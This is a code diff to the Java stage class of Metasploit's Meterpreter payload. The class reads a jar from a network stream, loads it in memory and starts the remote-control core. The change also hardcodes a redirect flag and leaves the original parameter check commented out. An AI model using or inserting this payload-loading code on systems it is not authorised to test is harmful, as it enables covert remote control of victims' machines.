@@ -13,12 +13,14 @@ import com.metasploit.meterpreter.MemoryBufferURLConnection;
 public class Meterpreter implements Stage {
 
     public void start(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
-        boolean noRedirectError = parameters[parameters.length - 1].equals("NoRedirect");
+        boolean noRedirectError = true;//parameters[parameters.length - 1].equals("NoRedirect");
         int coreLen = in.readInt();
         byte[] core = new byte[coreLen];
         in.readFully(core);
         URL coreURL = MemoryBufferURLConnection.createURL(core, "application/jar");
-        new URLClassLoader(new URL[]{coreURL}, getClass().getClassLoader()).loadClass("com.metasploit.meterpreter.Meterpreter").getConstructor(new Class[]{DataInputStream.class, OutputStream.class, boolean.class, boolean.class}).newInstance(new Object[]{in, out, Boolean.TRUE, new Boolean(!noRedirectError)});
+        new URLClassLoader(new URL[]{coreURL}, getClass().getClassLoader()).loadClass("com.metasploit.meterpreter.Meterpreter")
+                .getConstructor(new Class[]{DataInputStream.class, OutputStream.class, String[].class, boolean.class, boolean.class, boolean.class})
+                .newInstance(new Object[]{in, out, parameters, Boolean.TRUE, new Boolean(!noRedirectError), Boolean.TRUE});
         in.close();
         out.close();
     }
